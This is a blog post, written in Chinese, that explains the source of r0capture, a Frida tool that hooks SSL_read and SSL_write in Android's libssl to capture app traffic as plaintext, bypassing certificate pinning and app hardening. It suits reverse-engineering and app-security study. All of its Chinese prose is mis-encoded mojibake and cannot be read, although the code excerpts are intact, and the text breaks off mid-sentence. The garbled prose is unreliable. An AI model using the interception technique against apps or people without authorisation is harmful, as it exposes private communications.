      <url>/2024/10/23/R0capture%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="R0captureä»‹ç»"><a href="#R0captureä»‹ç»" class="headerlink" title="R0captureä»‹ç»"></a>R0captureä»‹ç»</h1><p>r0captureæ˜¯ä¸€ä¸ªåŸºäºfirdaå®ç°çš„ä¼˜ç§€çš„å¼€æºçš„æŠ“åŒ…å·¥å…·ã€‚å®ƒèƒ½å®Œæˆå¯¹TCPåè®®å±‚åŠä¸Šå±‚æ‰€æœ‰åè®®çš„æŠ¥æ–‡æ•è·ï¼Œä¸”ä¸ç”¨è€ƒè™‘è¯ä¹¦æ ¡éªŒç­‰é—®é¢˜ã€‚</p><p>å®ƒçš„å®ç°åŸºäºfrida_ssl_loggerï¼Œä¸¤é¡¹ç›®ä¾§é‡ä¸åŒã€‚</p><p>é¡¹ç›®åœ°å€ï¼šï¼ˆgithubï¼‰ <a href="https://github.com/r0ysue/r0capture">https://github.com/r0ysue/r0capture</a></p><p><strong>å®‰å“åº”ç”¨å±‚æŠ“åŒ…é€šæ€è„šæœ¬</strong></p><ul><li>ä»…é™å®‰å“å¹³å°ï¼Œæµ‹è¯•å®‰å“7ã€8ã€9ã€10ã€11ã€12ã€13ã€14 å¯ç”¨ ï¼›</li><li>æ— è§†æ‰€æœ‰è¯ä¹¦æ ¡éªŒæˆ–ç»‘å®šï¼Œä¸ç”¨è€ƒè™‘ä»»ä½•è¯ä¹¦çš„äº‹æƒ…ï¼›</li><li>é€šæ€TCP&#x2F;IPå››å±‚æ¨¡å‹ä¸­çš„åº”ç”¨å±‚ä¸­çš„å…¨éƒ¨åè®®ï¼›</li><li>é€šæ€åè®®åŒ…æ‹¬ï¼šHttp,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobufç­‰ç­‰ã€ä»¥åŠå®ƒä»¬çš„SSLç‰ˆæœ¬ï¼›</li><li>é€šæ€æ‰€æœ‰åº”ç”¨å±‚æ¡†æ¶ï¼ŒåŒ…æ‹¬HttpUrlConnectionã€Okhttp1&#x2F;3&#x2F;4ã€Retrofit&#x2F;Volleyç­‰ç­‰ï¼›</li><li>æ— è§†åŠ å›ºï¼Œä¸ç®¡æ˜¯æ•´ä½“å£³è¿˜æ˜¯äºŒä»£å£³æˆ–VMPï¼Œä¸ç”¨è€ƒè™‘åŠ å›ºçš„äº‹æƒ…ï¼›</li></ul><h1 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h1><p>ç”¨ä¸€å¥è¯æ¦‚æ‹¬r0captureçš„æ ¸å¿ƒåŸç†å³ä¸ºï¼š<strong>é€šè¿‡frida hook libssl.soä¸­çš„</strong> <strong>SSL_readå’ŒSSL_writeç­‰å‡½æ•°ä»¥å®ç°åœ¨sslé€šé“åŠ å¯†ä¹‹å‰æ‹¿åˆ°æ˜æ–‡å†…å®¹å¹¶å‚¨å­˜ã€‚</strong></p><p>ä¸åŒäºæˆ‘ä»¬ä¸€èˆ¬å¯¹äºsslæŠ¥æ–‡æ•è·çš„æ€è·¯ï¼Œæˆ‘ä»¬é€šå¸¸å¯¹äºhttpsçš„æŠ¥æ–‡éƒ½æ˜¯é€šè¿‡ä¸­é—´äººï¼ˆMITMï¼‰åŸç†ï¼Œå€ŸåŠ©HTTPä»£ç†å®Œæˆä¸­é—´äººå»ºç«‹ï¼Œä»è€Œæ•è·æ˜æ–‡è¯·æ±‚ã€‚ä½†æ˜¯r0captureåˆ™æ˜¯ç›´è¾¾åº•å±‚ï¼Œé€šè¿‡hookå®‰å“åŸºç¡€sslæ”¶å‘åŒ…çš„soï¼Œå®Œæˆå¯¹æ‰€æœ‰æŠ¥æ–‡çš„æ•è·ã€‚è¿™ä¸¤ç§æ–¹æ¡ˆå‡æœ‰ä¼˜åŠ£ï¼Œä¸‹é¢å…·ä½“ä»‹ç»ï¼š</p><h1 id="ä¼˜åŠ£åŠ¿"><a href="#ä¼˜åŠ£åŠ¿" class="headerlink" title="ä¼˜åŠ£åŠ¿"></a>ä¼˜åŠ£åŠ¿</h1><p>ç›¸è¾ƒäºä¼ ç»ŸæŠ“åŒ…æ–¹æ¡ˆï¼Œr0captureè§£å†³äº†<strong>å®‰å“ç«¯è¯ä¹¦æ ¡éªŒï¼ˆssl pinningï¼‰ã€ä»£ç†æ£€æµ‹ã€è‡ªå»ºåè®®ç­‰æŠ“ä¸åˆ°åŒ…çš„é—®é¢˜</strong>ã€‚æ­£æ˜¯å› ä¸ºå®ƒhookåˆ°tcpå±‚æŠ¥æ–‡æ”¶å‘å‡½æ•°ï¼Œå®ƒæ”¯æŒäº†tcpå±‚åŠä¸Šå±‚æ‰€æœ‰æŠ¥æ–‡æ•è·ï¼Œä½†æ˜¯ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œå®ƒå¤±å»äº†ä¸€äº›ä¾¿æ·æ€§ï¼Œå¦‚<strong>ä¾èµ–fridaã€ä¾èµ–wiresharkè§£å†³æŠ¥æ–‡å±•ç¤ºã€å¯¹å®‰å“ç‰ˆæœ¬æœ‰é™åˆ¶</strong>ç­‰ã€‚</p><p>æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬åˆæ¬¡å°è¯•æŠ“åŒ…æ—¶ï¼Œå¯ä»¥å…ˆä½¿ç”¨Charlesæˆ–è€…burpï¼Œä½†æ˜¯å½“æˆ‘ä»¬é‡åˆ°ä¸Šè¿°é—®é¢˜æŠ“ä¸åˆ°åŒ…æ—¶ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨<strong>R0capture</strong>è¿™ä¸ªå·¥å…·ã€‚</p><h1 id="æºç è§£è¯»"><a href="#æºç è§£è¯»" class="headerlink" title="æºç è§£è¯»"></a>æºç è§£è¯»</h1><p>æ•´ä¸ªé¡¹ç›®çš„ä»£ç åˆ†ä¸ºä¸¤ä¸ªæ–‡ä»¶r0capture.pyå’Œscript.jsã€‚</p><p>å…¥å£æ–‡ä»¶ä¸ºr0capture.pyã€‚</p><h2 id="r0capture-py"><a href="#r0capture-py" class="headerlink" title="r0capture.py"></a>r0capture.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    show_banner()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ArgParser</span>(argparse.ArgumentParser):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">error</span>(<span class="params">self, message</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ssl_logger v&quot;</span> + __version__)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;by &quot;</span> + __author__)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Modified by BigFaceCat&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: &quot;</span> + message)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(self.format_help().replace(<span class="string">&quot;usage:&quot;</span>, <span class="string">&quot;Usage:&quot;</span>))</span><br><span class="line">            self.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    parser = ArgParser(</span><br><span class="line">        add_help=<span class="literal">False</span>,</span><br><span class="line">        description=<span class="string">&quot;Decrypts and logs a process&#x27;s SSL traffic.&quot;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Examples:</span></span><br><span class="line"><span class="string">    %(prog)s -pcap ssl.pcap openssl</span></span><br><span class="line"><span class="string">    %(prog)s -verbose 31337</span></span><br><span class="line"><span class="string">    %(prog)s -pcap log.pcap -verbose wget</span></span><br><span class="line"><span class="string">    %(prog)s -pcap log.pcap -ssl &quot;*libssl.so*&quot; com.bigfacecat.testdemo</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.add_argument_group(<span class="string">&quot;Arguments&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;-pcap&quot;</span>, <span class="string">&#x27;-p&#x27;</span>, metavar=<span class="string">&quot;&lt;path&gt;&quot;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;Name of PCAP file to write&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;-host&quot;</span>, <span class="string">&#x27;-H&#x27;</span>, metavar=<span class="string">&quot;&lt;192.168.1.1:27042&gt;&quot;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;connect to remote frida-server on HOST&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;-verbose&quot;</span>, <span class="string">&quot;-v&quot;</span>, required=<span class="literal">False</span>, action=<span class="string">&quot;store_const&quot;</span>, default=<span class="literal">True</span>,</span><br><span class="line">                      const=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Show verbose output&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;process&quot;</span>, metavar=<span class="string">&quot;&lt;process name | process id&gt;&quot;</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;Process whose SSL calls to log&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;-ssl&quot;</span>, default=<span class="string">&quot;&quot;</span>, metavar=<span class="string">&quot;&lt;lib&gt;&quot;</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;SSL library to hook&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;--isUsb&quot;</span>, <span class="string">&quot;-U&quot;</span>, default=<span class="literal">False</span>, action=<span class="string">&quot;store_true&quot;</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;connect to USB device&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;--isSpawn&quot;</span>, <span class="string">&quot;-f&quot;</span>, default=<span class="literal">False</span>, action=<span class="string">&quot;store_true&quot;</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;if spawned app&quot;</span>)</span><br><span class="line">    args.add_argument(<span class="string">&quot;-wait&quot;</span>, <span class="string">&quot;-w&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;&lt;seconds&gt;&quot;</span>, default=<span class="number">0</span>,</span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;Time to wait for the process&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parsed = parser.parse_args()</span><br><span class="line">    logger.add(<span class="string">f&quot;<span class="subst">&#123;parsed.process.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)&#125;</span>-<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>.log&quot;</span>, rotation=<span class="string">&quot;500MB&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, enqueue=<span class="literal">True</span>, retention=<span class="string">&quot;10 days&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ssl_log(</span><br><span class="line">        <span class="built_in">int</span>(parsed.process) <span class="keyword">if</span> parsed.process.isdigit() <span class="keyword">else</span> parsed.process,</span><br><span class="line">        parsed.pcap,</span><br><span class="line">        parsed.host,</span><br><span class="line">        parsed.verbose,</span><br><span class="line">        isUsb=parsed.isUsb,</span><br><span class="line">        isSpawn=parsed.isSpawn,</span><br><span class="line">        ssllib=parsed.ssl,</span><br><span class="line">        wait=parsed.wait</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>1ã€è°ƒç”¨ <code>show_banner()</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯å±•ç¤ºå½“å‰é¡¹ç›®çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯</p><p>2ã€æ¥ä¸‹æ¥æ˜¯ <code>ArgParser</code> ç±»çš„å®šä¹‰å’Œä½¿ç”¨ï¼Œå®ƒç»§æ‰¿è‡ª <code>argparse.ArgumentParser</code>ï¼Œç”¨äºè§£æå‘½ä»¤è¡Œå‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ArgParser(argparse.ArgumentParser):</span><br><span class="line"></span><br><span class="line">    def error(self, message):</span><br><span class="line">        print(&quot;ssl_logger v&quot; + __version__)</span><br><span class="line">        print(&quot;by &quot; + __author__)</span><br><span class="line">        print(&quot;Modified by BigFaceCat&quot;)</span><br><span class="line">        print(&quot;Error: &quot; + message)</span><br><span class="line">        print()</span><br><span class="line">        print(self.format_help().replace(&quot;usage:&quot;, &quot;Usage:&quot;))</span><br><span class="line">        self.exit(0)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ªæ–°çš„ç±» <code>ArgParser</code>ï¼Œå®ƒæ‰©å±•äº† <code>argparse.ArgumentParser</code>ã€‚</li><li>é‡å†™ <code>error</code> æ–¹æ³•ï¼Œå½“è§£æå‚æ•°æ—¶å‘ç”Ÿé”™è¯¯æ—¶è¿™ä¸ªæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚åœ¨è¿™é‡Œï¼Œå½“å‡ºç°é”™è¯¯æ—¶ï¼Œå®ƒä¼šæ‰“å°å‡ºå·¥å…·çš„ç‰ˆæœ¬ã€ä½œè€…ä¿¡æ¯ï¼Œä»¥åŠé”™è¯¯ä¿¡æ¯å’Œå¸®åŠ©ä¿¡æ¯ã€‚æœ€åè°ƒç”¨ <code>self.exit(0)</code> ä»¥ç»“æŸç¨‹åºã€‚</li></ul><p>3ã€æ¥ä¸‹æ¥æ˜¯å‚æ•°è§£æçš„ä»£ç ï¼Œè¯¦ç»†æè¿°äº†å·¥å…·çš„åŠŸèƒ½ï¼Œå¹¶é€šè¿‡ç¤ºä¾‹ç”¨æ³•å¸®åŠ©ç”¨æˆ·äº†è§£å¦‚ä½•ä½¿ç”¨è¯¥å·¥å…·ã€‚</p><p>4ã€åé¢æ˜¯å¯¹åº”å‚æ•°è§£æï¼Œå‚æ•°å«ä¹‰å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410240958928.png" alt="image-20241024095846806"> </p><table><thead><tr><th>å‚æ•°</th><th>å«ä¹‰</th><th>å¿…éœ€æ€§</th></tr></thead><tbody><tr><td>-p</td><td>æŠ“åˆ°çš„æŠ¥æ–‡ä¿å­˜æˆpcapçš„æ–‡ä»¶å</td><td>éå¿…éœ€ï¼Œä¸æŒ‡å®šåˆ™ä¸ä¿å­˜</td></tr><tr><td>-H</td><td>è‡ªå®šä¹‰æŒ‡å®šfridaçš„hostå’Œport</td><td>éå¿…éœ€</td></tr><tr><td>-v</td><td>æ˜¾ç¤ºæ›´è¯¦ç»†çš„æ—¥å¿—è¾“å‡º</td><td>éå¿…éœ€ï¼Œé»˜è®¤æ˜¯</td></tr><tr><td>-ssl</td><td>æŒ‡å®šsslåº“åç§°</td><td>éå¿…éœ€ï¼Œé»˜è®¤<em>libssl.so</em></td></tr><tr><td>-U</td><td>è¿æ¥usbè®¾å¤‡çš„</td><td>éå¿…éœ€ï¼Œé»˜è®¤å¦</td></tr><tr><td>-f</td><td>ä»¥spawnå½¢å¼å¯åŠ¨</td><td>éå¿…éœ€ï¼Œé»˜è®¤å¦</td></tr><tr><td>-w</td><td>ç­‰å¾…å‡ ç§’åæ‰§è¡ŒæŠ“å–</td><td>éå¿…éœ€ï¼Œé»˜è®¤0</td></tr><tr><td>processname</td><td>è¿›ç¨‹åæˆ–è¿›ç¨‹id</td><td>å¿…é¡»</td></tr></tbody></table><p>5ã€æ¥ä¸‹æ¥è¿›å…¥ssl_logå‡½æ•°ï¼Œå†…éƒ¨å®šä¹‰äº†log_pcapå’Œon_messageï¼Œåˆ†åˆ«æ˜¯ä¿å­˜pcapå…·ä½“å‡½æ•°å’Œfridaçš„æ¶ˆæ¯å›è°ƒå‡½æ•°ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241001578.png" alt="image-20241024100121547"> </p><ul><li>log_pcapå‡½æ•°ï¼šè¦åŠŸèƒ½æ˜¯å°†æ•è·åˆ°çš„ SSL æ•°æ®åŒ…å†™å…¥æŒ‡å®šçš„ pcap æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿è¿›è¡Œåç»­çš„åˆ†æå’Œå¤„ç†</li><li>å®šä¹‰on_messageå‡½æ•°ï¼šæ˜¯ <code>ssl_log</code> ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œè´Ÿè´£æ¥æ”¶å¹¶å¤„ç†æ¥è‡ª Frida çš„æ¶ˆæ¯ã€‚å®ƒä¸ä»…ç®¡ç†é”™è¯¯æƒ…å†µï¼Œè¿˜è®°å½•æ•è·çš„æ•°æ®ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°æ§åˆ¶å°æˆ–æ–‡ä»¶ä¸­ã€‚å…³é”®ä»£ç è¯´æ˜å¦‚ä¸‹ï¼š</li></ul><p>ï¼ˆ1ï¼‰é¦–å…ˆè¿æ¥è®¾å¤‡è·å–åˆ°deviceså’Œsession</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if isUsb:</span><br><span class="line">        try:</span><br><span class="line">            device = frida.get_usb_device()</span><br><span class="line">        except:</span><br><span class="line">            device = frida.get_remote_device()</span><br><span class="line">    else:</span><br><span class="line">        if host:</span><br><span class="line">            manager = frida.get_device_manager()</span><br><span class="line">            device = manager.add_remote_device(host)</span><br><span class="line">        else:</span><br><span class="line">            device = frida.get_local_device()</span><br><span class="line"></span><br><span class="line">    if isSpawn:</span><br><span class="line">        pid = device.spawn([process])</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        session = device.attach(pid)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        device.resume(pid)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;attach&quot;)</span><br><span class="line">        session = device.attach(process)</span><br><span class="line">    if wait &gt; 0:</span><br><span class="line">        print(f&quot;wait for &#123;wait&#125; seconds&quot;)</span><br><span class="line">        time.sleep(wait)</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¦‚æœå‘½ä»¤å‚æ•°æœ‰ pcapï¼Œå°±åˆ›å»º pcap æ–‡ä»¶ï¼Œå°†hookåˆ°çš„æ•°æ®å‚¨å­˜è¿›å»ã€‚è¿™é‡Œåªæ˜¯å…ˆå†™äº†ä¸€ä¸ªæ–‡ä»¶å¤´ã€‚pcap çš„æ ¼å¼å¯çœ‹ï¼š</p><p><a href="https://blog.csdn.net/in7deforever/article/details/6460595">https://blog.csdn.net/in7deforever/article/details/6460595</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if pcap:</span><br><span class="line">        pcap_file = open(pcap, &quot;wb&quot;, 0)</span><br><span class="line">        for writes in (</span><br><span class="line">                (&quot;=I&quot;, 0xa1b2c3d4),  # Magic number</span><br><span class="line">                (&quot;=H&quot;, 2),  # Major version number</span><br><span class="line">                (&quot;=H&quot;, 4),  # Minor version number</span><br><span class="line">                (&quot;=i&quot;, time.timezone),  # GMT to local correction</span><br><span class="line">                (&quot;=I&quot;, 0),  # Accuracy of timestamps</span><br><span class="line">                (&quot;=I&quot;, 65535),  # Max length of captured packets</span><br><span class="line">                (&quot;=I&quot;, 228)):  # Data link type (LINKTYPE_IPV4)</span><br><span class="line">            pcap_file.write(struct.pack(writes[0], writes[1]))</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰åŠ è½½script.jsè„šæœ¬ï¼Œè°ƒç”¨å®šä¹‰çš„RPCæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(Path(__file__).resolve().parent.joinpath(&quot;./script.js&quot;), encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">        _FRIDA_SCRIPT = f.read()</span><br><span class="line">        # _FRIDA_SCRIPT = session.create_script(content)</span><br><span class="line">        # print(_FRIDA_SCRIPT)</span><br><span class="line">    script = session.create_script(_FRIDA_SCRIPT)</span><br><span class="line">    script.on(&quot;message&quot;, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    if ssllib != &quot;&quot;:</span><br><span class="line">        script.exports.setssllib(ssllib)</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ç›‘å¬ä¸­æ–­ä¿¡å·ï¼ˆCtrl+Cï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;Press Ctrl+C to stop logging.&quot;)</span><br><span class="line"></span><br><span class="line">    def stoplog(signum, frame):</span><br><span class="line">        print(&#x27;You have stoped logging.&#x27;)</span><br><span class="line">        session.detach()</span><br><span class="line">        if pcap:</span><br><span class="line">            pcap_file.flush()</span><br><span class="line">            pcap_file.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    signal.signal(signal.SIGINT, stoplog)</span><br><span class="line">    signal.signal(signal.SIGTERM, stoplog)</span><br><span class="line">    sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="script-js"><a href="#script-js" class="headerlink" title="script.js"></a>script.js</h2><p>é¦–å…ˆï¼ŒæŠ˜å ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å®šä¹‰äº†å¦‚ä¸‹å‡½æ•°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241016754.png" alt="image-20241024101631698"> </p><h3 id="rpc-exports"><a href="#rpc-exports" class="headerlink" title="rpc.exports"></a>rpc.exports</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpc.exports = &#123;</span><br><span class="line">  setssllib: function (name) &#123;</span><br><span class="line">    console.log(&quot;setSSLLib =&gt; &quot; + name);</span><br><span class="line">    libname = name;</span><br><span class="line">    initializeGlobals();</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åˆšè¿›æ¥çœ‹åˆ°çš„å¯¼å‡ºçš„setssllibå‡½æ•°ï¼Œç”¨äºä»å¤–éƒ¨æŒ‡å®šsslåº“åç§°ï¼Œä¸»è¦ç”¨äºéƒ¨åˆ†éåŸå§‹ssl.soæ–‡ä»¶åçš„åœºæ™¯ã€‚</p><h3 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241024402.png" alt="image-20241024102432361"> </p><p>æ¥ä¸‹æ¥çš„æ˜¯uuidç”Ÿæˆç®—æ³•ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚åœ¨æœ¬è„šæœ¬ä¸­æ˜¯ç”¨äºç”Ÿæˆæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚ç‰¹åˆ«æ˜¯ï¼Œåœ¨ä¿å­˜è¯ä¹¦ä¸º p12 æ ¼å¼æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨äº†è¿™ä¸ªéšæœºå­—ç¬¦ä¸²ï¼Œä»¥ç¡®ä¿æ–‡ä»¶åçš„å”¯ä¸€æ€§ï¼Œé¿å…åœ¨åŒä¸€ç›®å½•ä¸­äº§ç”Ÿé‡å¤æ–‡ä»¶ã€‚</p><h3 id="return-zero"><a href="#return-zero" class="headerlink" title="return_zero"></a>return_zero</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241035965.png" alt="image-20241024103553934"> </p><p>æ²¡å•¥ä½œç”¨ï¼Œå°±æ˜¯è¿”å›äº†ä¸€ä¸ª <strong>0</strong></p><h3 id="initializeGlobals"><a href="#initializeGlobals" class="headerlink" title="initializeGlobals"></a>initializeGlobals</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241037816.png" alt="image-20241024103746769"> </p><p>1ã€è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ª frida çš„ apiï¼Œ<strong>ApiResolverã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var resolver = new ApiResolver(&quot;module&quot;);</span><br><span class="line">  var exps = [</span><br><span class="line">    [Process.platform == &quot;darwin&quot; ? &quot;*libboringssl*&quot; : &quot;*libssl*&quot;, [&quot;SSL_read&quot;, &quot;SSL_write&quot;, &quot;SSL_get_fd&quot;, &quot;SSL_get_session&quot;, &quot;SSL_SESSION_get_id&quot;]], // for ios and Android</span><br><span class="line">    [Process.platform == &quot;darwin&quot; ? &quot;*libsystem*&quot; : &quot;*libc*&quot;, [&quot;getpeername&quot;, &quot;getsockname&quot;, &quot;ntohs&quot;, &quot;ntohl&quot;]]</span><br><span class="line">  ];</span><br></pre></td></tr></table></figure><p>æšä¸¾å½“å‰è¿›ç¨‹ä¸­å·²ç»åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“çš„å¯¼å…¥å¯¼å‡ºå‡½æ•°åç§°ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241045195.png" alt="image-20241024104533162"> </p><p>è¿˜å…¼å®¹äº† iosã€‚ApiResolver ä¼šè‡ªåŠ¨æœç´¢ç¬¦åˆåŒ¹é…è§„åˆ™çš„ç¬¦å·åœ°å€ï¼Œå¦‚æœæ˜¯å®‰å“åˆ™ä»libsslå’Œlibcä¸­æ‰¾åˆ°ç›¸å…³å‡½æ•°ï¼Œå¦‚æœæ˜¯iosåˆ™â€¦â€¦ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œå…³æ³¨çš„å‡½æ•°åˆ†åˆ«æœ‰ï¼šlibssl.soé‡Œé¢çš„â€SSL_readâ€, â€œSSL_writeâ€, â€œSSL_get_fdâ€, â€œSSL_get_sessionâ€, â€œSSL_SESSION_get_idâ€å’Œlibc.soé‡Œé¢çš„â€getpeernameâ€, â€œgetsocknameâ€, â€œntohsâ€, â€œntohlâ€ã€‚</p><p>2ã€æ¥ä¸‹æ¥é€šè¿‡enumerateMatcheså‡½æ•°æ‰¾åˆ°è¿™ä¸¤ä¸ªlibåº“çš„è¿™äº›å¯¼å‡ºå‡½æ•°ï¼Œå¹¶é€šè¿‡å‡½æ•°åä¿å­˜ä¸ºåç§°-åœ°å€çš„æ˜ å°„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241049974.png" alt="image-20241024104938933"> </p><p>3ã€æœ€åï¼Œç»è¿‡ä¸Šè¿°æ‹¿åˆ°äº†å‡½æ•°çš„åœ°å€ï¼Œå†é€šè¿‡NativeFunctionç”Ÿæˆå¯è°ƒç”¨çš„å‡½æ•°ã€‚å°±æ˜¯é€šè¿‡å‡½æ•°åœ°å€å’Œå‚æ•°ç±»å‹ç”ŸæˆNativeFunctionï¼Œåç»­ä½¿ç”¨æ—¶å³å¯ç›´æ¥è°ƒç”¨ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241050620.png" alt="image-20241024105049587"> </p><p>æ¥ä¸‹æ¥æ‰§è¡Œäº†initializeGlobalså‡½æ•°ã€‚</p><h3 id="ipToNumber"><a href="#ipToNumber" class="headerlink" title="ipToNumber"></a>ipToNumber</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241053498.png" alt="image-20241024105302463"> </p><p>ä¸»è¦ä½œç”¨æ˜¯ç”¨äºå°†å››æ®µå¼çš„ipä¸²è½¬æ¢ä¸ºæ•´æ•°æ•°å­—å½¢å¼ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œ192.168.0.1 è½¬æ¢åä¸º 16820416</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241059569.png" alt="image-20241024105905521"> </p><h3 id="getPortsAndAddresses"><a href="#getPortsAndAddresses" class="headerlink" title="getPortsAndAddresses"></a>getPortsAndAddresses</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241059990.png" alt="image-20241024105952949"> </p><p>ä¸»è¦åŠŸèƒ½æ˜¯æ ¹æ®socketæ‹¿åˆ°æœ¬åœ°åœ°å€å’Œè¿œç«¯åœ°å€ï¼Œè¿™é‡Œä¸»è¦ä¾èµ–çš„æ˜¯ä¸¤ä¸ªæ¥å£Socket.localAddresså’ŒSocket.peerAddressã€‚è¿™ä¸¤ä¸ªåœ°å€å°±æ˜¯wiresharkæ˜¾ç¤ºçš„srcå’Œdeståœ°å€äº†ï¼Œæ ¹æ®è¿™ä¿©åœ°å€ä¹Ÿå°±èƒ½æ¸…æ¥šåœ°çŸ¥é“æ˜¯æœ¬åœ°å“ªä¸ªç«¯å£å’Œå¤–éƒ¨å“ªä¸ªipçš„å“ªä¸ªç«¯å£é€šä¿¡äº†ã€‚</p><h3 id="getSslSessionId"><a href="#getSslSessionId" class="headerlink" title="getSslSessionId"></a>getSslSessionId</h3><p>æ¥ä¸‹æ¥æ˜¯getSslSessionIdå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦ç”¨äºæ 